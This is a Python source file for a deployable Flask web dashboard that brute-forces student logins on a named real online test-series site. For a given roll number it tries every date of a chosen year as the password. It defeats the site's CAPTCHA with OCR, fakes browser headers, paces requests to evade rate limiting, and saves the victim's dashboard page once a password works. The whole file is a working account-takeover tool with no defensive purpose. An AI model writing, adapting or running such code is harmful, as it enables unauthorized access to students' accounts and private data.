#!/usr/bin/env python3
"""
Motion OTS Brute‑Force Dashboard – One‑by‑One with Delays
Author: Potato

This script brute‑forces the login on onlinetestseries.motion.ac.in
by trying every date in a given year as the password (DD-MM-YYYY).
It processes passwords sequentially with a configurable delay to avoid
rate limiting and to be gentle on the server.

Features:
- Flask web dashboard with live logs
- SQLite database for job persistence
- ddddocr CAPTCHA solver with fallback (Tesseract optional)
- Configurable delay between attempts (default 2 seconds)
- Progress tracking with live updates
- Retry logic (up to 3 attempts per password with fresh CAPTCHAs)
- Stop job functionality
- Test endpoint for manual password verification

Deployment: Ready for Render with Docker.
"""

import os
import sys
import time
import uuid
import json
import threading
import queue
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import re
from datetime import datetime, timedelta
import sqlite3
import traceback
from flask import Flask, render_template_string, request, jsonify, g

# ----------------------------------------------------------------------
# CONFIGURATION
# ----------------------------------------------------------------------
DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds (adjust to be slower/faster)
MAX_RETRIES_PER_PASSWORD = 3          # number of times to retry with fresh CAPTCHA
CONCURRENT_WORKERS = 1                # keep at 1 for strict one‑by‑one
CAPTCHA_FETCH_TIMEOUT = 8             # seconds
LOGIN_TIMEOUT = 12                    # seconds
POLLING_INTERVAL = 1.5                # seconds for frontend updates

# ----------------------------------------------------------------------
# OCR SETUP (ddddocr)
# ----------------------------------------------------------------------
try:
    import ddddocr
    ocr = ddddocr.DdddOcr(ocr=True, det=False)
    OCR_OK = True
    print("✅ ddddocr initialized successfully")
except ImportError:
    OCR_OK = False
    print("❌ ddddocr not installed. Run: pip install ddddocr")
    sys.exit(1)
except Exception as e:
    OCR_OK = False
    print(f"❌ ddddocr initialization failed: {e}")
    sys.exit(1)

# Optional Tesseract fallback (if installed)
try:
    import pytesseract
    pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
    TESSERACT_OK = True
except:
    TESSERACT_OK = False

def solve_captcha_image(img_bytes, log_queue=None):
    """
    Solve CAPTCHA using ddddocr.
    Returns the solved text (first 6 chars) or None on failure.
    """
    try:
        result = ocr.classification(img_bytes)
        if result:
            # Keep only uppercase letters and digits
            cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
            if len(result) >= 4:
                return result[:6]
        # If ddddocr fails, try Tesseract fallback
        if TESSERACT_OK:
            from PIL import Image
            from io import BytesIO
            img = Image.open(BytesIO(img_bytes))
            img = img.convert('L')
            img = img.point(lambda p: 0 if p < 140 else 255, '1')
            custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            text = pytesseract.image_to_string(img, config=custom_config)
            cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
        return None
    except Exception as e:
        if log_queue:
            log_queue.put_nowait(f"❌ OCR error: {str(e)}")
        return None

# ----------------------------------------------------------------------
# DATABASE SETUP
# ----------------------------------------------------------------------
DATABASE = 'brute_jobs.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS jobs (
                job_id TEXT PRIMARY KEY,
                user_id TEXT NOT NULL,
                year INTEGER NOT NULL,
                status TEXT DEFAULT 'idle',
                password TEXT,
                logs TEXT DEFAULT '[]',
                start_time TEXT,
                end_time TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# ----------------------------------------------------------------------
# JOB CLASS
# ----------------------------------------------------------------------
class BruteJob:
    """
    A brute‑force job that runs in a background thread.
    It processes one password at a time with delays.
    """

    def __init__(self, job_id, user_id, year, status='idle', password=None, logs=None):
        self.job_id = job_id
        self.user_id = user_id
        self.year = year
        self.status = status          # idle, running, success, failed, stopped
        self.password = password
        self.logs = logs if logs is not None else []
        self.start_time = None
        self.end_time = None
        self.thread = None
        self.stop_flag = False
        self.log_queue = queue.Queue()
        self.total_passwords = 0
        self.processed = 0

    @classmethod
    def from_db_row(cls, row):
        job = cls(
            row['job_id'],
            row['user_id'],
            row['year'],
            row['status'],
            row['password'],
            json.loads(row['logs']) if row['logs'] else []
        )
        job.start_time = row.get('start_time')
        job.end_time = row.get('end_time')
        return job

    def save_to_db(self):
        with sqlite3.connect(DATABASE) as conn:
            conn.execute('''
                INSERT OR REPLACE INTO jobs
                (job_id, user_id, year, status, password, logs, start_time, end_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                self.job_id,
                self.user_id,
                self.year,
                self.status,
                self.password,
                json.dumps(self.logs),
                self.start_time,
                self.end_time
            ))
            conn.commit()

    def start(self):
        if self.thread and self.thread.is_alive():
            return
        self.status = 'running'
        self.start_time = datetime.now().isoformat()
        self.logs = []
        self.stop_flag = False
        self.password = None
        self.save_to_db()
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()

    def _run(self):
        try:
            asyncio.run(self._async_bruteforce())
        except Exception as e:
            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
        finally:
            self.status = 'success' if self.password else 'failed'
            self.end_time = datetime.now().isoformat()
            self.save_to_db()

    async def _async_bruteforce(self):
        """
        Main async loop: generate all dates in the year and process one by one.
        """
        log_queue = self.log_queue
        user_id = self.user_id
        year = self.year

        start_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)
        dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
        self.total_passwords = len(dates)
        self.processed = 0
        log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({self.total_passwords} passwords)")
        log_queue.put_nowait(f"⏱️  Delay between attempts: {DELAY_BETWEEN_ATTEMPTS}s, retries: {MAX_RETRIES_PER_PASSWORD}")

        connector = aiohttp.TCPConnector(limit=CONCURRENT_WORKERS, limit_per_host=CONCURRENT_WORKERS)
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(CONCURRENT_WORKERS)
            result_queue = asyncio.Queue()
            stop_event = asyncio.Event()

            tasks = []
            for date in dates:
                password = date.strftime("%d-%m-%Y")
                tasks.append(asyncio.create_task(
                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue)
                ))

            found = None
            session_obj = None
            # Wait for the first success or all tasks to finish
            while True:
                try:
                    found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                    break
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
                if stop_event.is_set():
                    break

            # Cancel remaining tasks
            for t in tasks:
                t.cancel()

            if found:
                self.password = found
                log_queue.put_nowait(f"🎉 Password found: {found}")
                if session_obj:
                    try:
                        dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
                        if dash.status == 200:
                            with open(f"dashboard_{user_id}.html", "w") as f:
                                f.write(await dash.text())
                            log_queue.put_nowait("💾 Dashboard HTML saved.")
                    except Exception as e:
                        log_queue.put_nowait(f"⚠️ Dashboard save error: {e}")
            else:
                log_queue.put_nowait("❌ No password found in that year.")

    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue):
        """
        Worker for a single password. It tries up to MAX_RETRIES_PER_PASSWORD times
        and then moves on to the next password.
        """
        if stop_event.is_set():
            return
        async with semaphore:
            # Update progress
            self.processed += 1
            progress_msg = f"Progress: {self.processed}/{self.total_passwords} ({self.processed/self.total_passwords*100:.1f}%)"
            log_queue.put_nowait(f"⏳ Attempting {password}  [{progress_msg}]")

            for attempt in range(MAX_RETRIES_PER_PASSWORD):
                if stop_event.is_set():
                    return
                try:
                    # Step 1: Fetch and solve CAPTCHA
                    captcha = await self._fetch_captcha(session, log_queue)
                    if not captcha:
                        log_queue.put_nowait(f"⏭️  No CAPTCHA for {password} (attempt {attempt+1})")
                        continue
                    log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")

                    # Step 2: Perform login
                    success, response = await self._try_login(session, user_id, password, captcha, log_queue)
                    if success:
                        log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
                        result_queue.put_nowait((password, session))
                        stop_event.set()
                        return

                    # Step 3: Check if we should retry
                    if response in ("captcha_error", "redirect_failure", "timeout"):
                        log_queue.put_nowait(f"🔄 Retry‑able ({response}) – attempt {attempt+1}/{MAX_RETRIES_PER_PASSWORD}")
                        await asyncio.sleep(1.0)   # small delay before retry
                        continue
                    else:
                        # Non‑retryable error – log it and give up
                        log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
                        break  # break out of retry loop

                except asyncio.TimeoutError:
                    log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
                    await asyncio.sleep(1.0)
                    continue
                except Exception as e:
                    log_queue.put_nowait(f"❌ Worker error: {str(e)}")
                    break

            # If we exhausted retries without success
            log_queue.put_nowait(f"⏭️  Giving up on {password} after {MAX_RETRIES_PER_PASSWORD} attempts")

            # Apply delay before next password (except if stopped)
            if not stop_event.is_set():
                log_queue.put_nowait(f"⏱️  Waiting {DELAY_BETWEEN_ATTEMPTS}s before next attempt...")
                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)

    async def _fetch_captcha(self, session, log_queue):
        """
        Fetch a CAPTCHA image and solve it.
        Returns the text or None.
        """
        for attempt in range(3):
            try:
                rand = int(time.time() * 1000) + attempt + os.getpid()
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=CAPTCHA_FETCH_TIMEOUT)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        if len(img_bytes) < 100:
                            await asyncio.sleep(0.2)
                            continue
                        loop = asyncio.get_running_loop()
                        captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                        if captcha:
                            return captcha
                    await asyncio.sleep(0.3)
            except asyncio.TimeoutError:
                log_queue.put_nowait("⏰ CAPTCHA fetch timeout")
            except Exception as e:
                log_queue.put_nowait(f"⚠️ CAPTCHA error: {e}")
        return None

    async def _try_login(self, session, user_id, password, captcha, log_queue):
        """
        Attempt login with the given credentials and CAPTCHA.
        Returns (success, message).
        """
        data = {
            "login_username": user_id,
            "login_password": password,
            "captcha": captcha,
            "login": ""
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://onlinetestseries.motion.ac.in/",
        }
        try:
            async with session.post(
                "https://onlinetestseries.motion.ac.in/login.php",
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=LOGIN_TIMEOUT)
            ) as resp:
                if resp.status == 302:
                    location = resp.headers.get("Location", "")
                    if "dashboard/student-dashboard.php" in location:
                        return True, None
                    else:
                        # Redirect to index.php – likely CAPTCHA error or wrong credentials
                        return False, "redirect_failure"
                elif resp.status == 200:
                    text = await resp.text()
                    soup = BeautifulSoup(text, "html.parser")
                    err = soup.find("div", class_="alertmsg")
                    if err:
                        err_text = err.text.strip()
                        if "CAPTCHA" in err_text or "captcha" in err_text:
                            return False, "captcha_error"
                        else:
                            return False, err_text[:100]
                    else:
                        # No error div; check for dashboard indicators
                        if "dashboard" in text.lower() or "logout" in text.lower():
                            return True, None
                        return False, "unknown_failure"
                else:
                    return False, f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            return False, f"Exception: {e}"

    def stop(self):
        self.stop_flag = True
        self.status = 'stopped'
        self.save_to_db()

    def get_updates(self):
        """
        Retrieve new log messages from the queue.
        Returns a list of new messages and updates the job's logs.
        """
        new_logs = []
        while not self.log_queue.empty():
            try:
                msg = self.log_queue.get_nowait()
                self.logs.append(msg)
                new_logs.append(msg)
                # If success message is detected, update status and password
                if "SUCCESS" in msg or "Password found" in msg:
                    if "Password =" in msg:
                        self.password = msg.split("Password =")[-1].strip()
                    self.status = 'success'
                # Save to DB periodically
                if len(self.logs) % 5 == 0:
                    self.save_to_db()
            except:
                break
        if new_logs:
            self.save_to_db()
        return new_logs


# ----------------------------------------------------------------------
# FLASK WEB APPLICATION
# ----------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = 'supersecretkey-change-this-in-production'
jobs = {}

def load_jobs_from_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM jobs ORDER BY created_at DESC").fetchall()
        for row in rows:
            job = BruteJob.from_db_row(row)
            jobs[job.job_id] = job
    print(f"📂 Loaded {len(jobs)} jobs from database.")


@app.route('/')
def index():
    """
    Main dashboard page.
    """
    HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Motion Brute‑Force Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
        h1 { color: #58a6ff; }
        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .form-group label { font-weight: bold; min-width: 80px; }
        .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 150px; }
        .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-start { background: #238636; color: #fff; }
        .btn-start:hover { background: #2ea043; }
        .btn-stop { background: #da3633; color: #fff; }
        .btn-stop:hover { background: #f85149; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .logs-box { background: #0d1117; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; white-space: pre-wrap; margin-top: 10px; }
        .log-entry { border-bottom: 1px solid #21262d; padding: 3px 0; }
        .success { color: #3fb950; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        .status-bar { padding: 10px; background: #0d1117; border-radius: 6px; margin: 10px 0; }
        .job-list { margin-top: 20px; }
        .job-item { background: #0d1117; padding: 10px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .job-status { font-weight: bold; }
        .job-status.running { color: #58a6ff; }
        .job-status.success { color: #3fb950; }
        .job-status.failed { color: #f85149; }
        .job-status.stopped { color: #d29922; }
        .job-status.idle { color: #8b949e; }
        .job-actions a { color: #58a6ff; margin-left: 10px; cursor: pointer; }
        .help-text { color: #8b949e; font-size: 0.9em; margin-top: 5px; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>🚀 Motion OTS Brute‑Forcer</h1>
        <p>Enter a user ID (roll number) and a year to test all dates as passwords.</p>
        <p class="help-text">⏱️  One password at a time with a delay between attempts to avoid rate‑limiting.</p>
        <form id="bruteForm">
            <div class="form-group">
                <label for="user_id">User ID</label>
                <input type="text" id="user_id" placeholder="e.g. 26173000005" required>
            </div>
            <div class="form-group">
                <label for="year">Year</label>
                <input type="number" id="year" placeholder="e.g. 2009" min="1900" max="2100" required>
            </div>
            <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                <button type="submit" class="btn btn-start" id="startBtn">▶ Start Brute‑Force</button>
                <button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
            </div>
        </form>
        <div class="status-bar">
            <span id="status-text">Idle</span>
            <span id="password-result"></span>
        </div>
        <div id="logs" class="logs-box">Waiting for logs...</div>
    </div>
    <div class="card">
        <h2>📋 Previous Jobs</h2>
        <div id="jobList" class="job-list"></div>
    </div>
</div>
<script>
    let jobId = null;
    let pollInterval = null;
    const logsDiv = document.getElementById('logs');
    const statusText = document.getElementById('status-text');
    const passwordResult = document.getElementById('password-result');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const jobListDiv = document.getElementById('jobList');

    document.getElementById('bruteForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user_id = document.getElementById('user_id').value.trim();
        const year = document.getElementById('year').value.trim();
        if (!user_id || !year) return alert('Please fill all fields.');
        startBtn.disabled = true;
        stopBtn.disabled = false;
        logsDiv.innerHTML = '';
        statusText.innerText = 'Starting...';
        passwordResult.innerText = '';
        const formData = new FormData();
        formData.append('user_id', user_id);
        formData.append('year', year);
        try {
            const resp = await fetch('/start', { method: 'POST', body: formData });
            const data = await resp.json();
            if (data.error) {
                alert(data.error);
                resetUI();
                return;
            }
            jobId = data.job_id;
            statusText.innerText = 'Running...';
            if (pollInterval) clearInterval(pollInterval);
            pollInterval = setInterval(pollStatus, 1500);
            loadJobs();
        } catch (err) {
            alert('Error starting job: ' + err.message);
            resetUI();
        }
    });

    stopBtn.addEventListener('click', async () => {
        if (!jobId) return;
        try {
            await fetch(`/stop/${jobId}`, { method: 'POST' });
            statusText.innerText = 'Stopped by user';
            stopBtn.disabled = true;
            startBtn.disabled = false;
            if (pollInterval) clearInterval(pollInterval);
            loadJobs();
        } catch (err) {
            alert('Stop error: ' + err.message);
        }
    });

    async function pollStatus() {
        if (!jobId) return;
        try {
            const resp = await fetch(`/status/${jobId}`);
            const data = await resp.json();
            if (data.error) {
                console.error(data.error);
                clearInterval(pollInterval);
                resetUI();
                return;
            }
            if (data.new_logs && data.new_logs.length > 0) {
                data.new_logs.forEach(msg => {
                    const div = document.createElement('div');
                    div.className = 'log-entry';
                    if (msg.includes('SUCCESS') || msg.includes('Password found')) {
                        div.classList.add('success');
                    } else if (msg.includes('❌') || msg.includes('Error')) {
                        div.classList.add('error');
                    } else {
                        div.classList.add('info');
                    }
                    div.textContent = msg;
                    logsDiv.appendChild(div);
                    logsDiv.scrollTop = logsDiv.scrollHeight;
                });
            }
            if (data.status === 'success') {
                statusText.innerText = '✅ Success!';
                passwordResult.innerText = `🎉 Password: ${data.password}`;
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'failed') {
                statusText.innerText = '❌ Failed – no password found.';
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'stopped') {
                statusText.innerText = '⏹ Stopped.';
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'running') {
                statusText.innerText = '🔄 Running...';
            }
        } catch (err) {
            console.error('Poll error:', err);
        }
    }

    async function loadJobs() {
        try {
            const resp = await fetch('/jobs');
            const data = await resp.json();
            if (data.jobs) {
                jobListDiv.innerHTML = data.jobs.map(j => `
                    <div class="job-item">
                        <div>
                            <strong>${j.user_id}</strong> (${j.year})
                            <span class="job-status ${j.status}">${j.status.toUpperCase()}</span>
                            ${j.password ? `🔑 ${j.password}` : ''}
                            <span style="font-size:0.8em;color:#8b949e;">${j.created_at}</span>
                        </div>
                        <div>
                            <a onclick="viewJob('${j.job_id}')">View Logs</a>
                            ${j.status === 'running' ? `<a onclick="stopJob('${j.job_id}')">Stop</a>` : ''}
                        </div>
                    </div>
                `).join('');
            }
        } catch(err) { console.error(err); }
    }

    async function viewJob(jid) {
        const resp = await fetch(`/status/${jid}`);
        const data = await resp.json();
        if (data.logs) {
            logsDiv.innerHTML = data.logs.map(msg => `<div class="log-entry">${msg}</div>`).join('');
            statusText.innerText = `Job ${jid} (${data.status})`;
            passwordResult.innerText = data.password ? `Password: ${data.password}` : '';
        }
    }

    async function stopJob(jid) {
        if (!confirm('Stop this job?')) return;
        try {
            await fetch(`/stop/${jid}`, { method: 'POST' });
            loadJobs();
        } catch(err) { alert(err.message); }
    }

    function resetUI() {
        startBtn.disabled = false;
        stopBtn.disabled = true;
        if (pollInterval) clearInterval(pollInterval);
        jobId = null;
    }
    loadJobs();
</script>
</body>
</html>
    '''
    return render_template_string(HTML)


@app.route('/start', methods=['POST'])
def start_job():
    """
    Start a new brute‑force job.
    """
    user_id = request.form.get('user_id')
    year = request.form.get('year')
    if not user_id or not year:
        return jsonify({'error': 'Missing user_id or year'}), 400
    try:
        year = int(year)
    except:
        return jsonify({'error': 'Year must be integer'}), 400

    job_id = str(uuid.uuid4())
    job = BruteJob(job_id, user_id, year)
    jobs[job_id] = job
    job.save_to_db()
    job.start()
    return jsonify({'job_id': job_id})


@app.route('/status/<job_id>')
def status(job_id):
    """
    Get the current status and new logs for a job.
    """
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    new_logs = job.get_updates()
    return jsonify({
        'status': job.status,
        'password': job.password,
        'logs': job.logs,
        'new_logs': new_logs,
    })


@app.route('/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    """
    Stop a running job.
    """
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    job.stop()
    return jsonify({'status': 'stopped'})


@app.route('/jobs')
def list_jobs():
    """
    List all jobs from the database.
    """
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT job_id, user_id, year, status, password, created_at FROM jobs ORDER BY created_at DESC").fetchall()
        return jsonify({'jobs': [dict(row) for row in rows]})


@app.route('/test-password', methods=['POST'])
async def test_password():
    """
    Test a specific password manually and return the raw server response.
    Expects JSON: {"user_id": "...", "password": "...", "captcha": "..."}
    """
    data = request.get_json()
    if not data:
        return jsonify({'error': 'JSON body required'}), 400

    user_id = data.get('user_id')
    password = data.get('password')
    captcha = data.get('captcha')

    if not user_id or not password:
        return jsonify({'error': 'user_id and password required'}), 400

    # If CAPTCHA not provided, fetch one
    if not captcha:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for attempt in range(3):
                rand = int(time.time() * 1000) + attempt
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        captcha = solve_captcha_image(img_bytes, None)
                        if captcha:
                            break
            if not captcha:
                return jsonify({'error': 'Could not fetch CAPTCHA'}), 400

    # Perform login
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html",
        "Referer": "https://onlinetestseries.motion.ac.in/",
    }
    login_data = {
        "login_username": user_id,
        "login_password": password,
        "captcha": captcha,
        "login": ""
    }
    try:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.post(
                "https://onlinetestseries.motion.ac.in/login.php",
                data=login_data,
                headers=headers,
                allow_redirects=False
            ) as resp:
                result = {
                    'status': resp.status,
                    'headers': dict(resp.headers),
                }
                if resp.status == 302:
                    result['location'] = resp.headers.get('Location')
                else:
                    text = await resp.text()
                    result['body_preview'] = text[:500]
                return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ----------------------------------------------------------------------
# TEARDOWN
# ----------------------------------------------------------------------
@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, '_database', None)
    if db:
        db.close()


# ----------------------------------------------------------------------
# STARTUP
# ----------------------------------------------------------------------
if __name__ == '__main__':
    init_db()
    load_jobs_from_db()
    # Run with debug=False for production
    app.run(debug=False, host='0.0.0.0', port=5000)
else:
    # For Gunicorn (production)
    init_db()
    load_jobs_from_db()
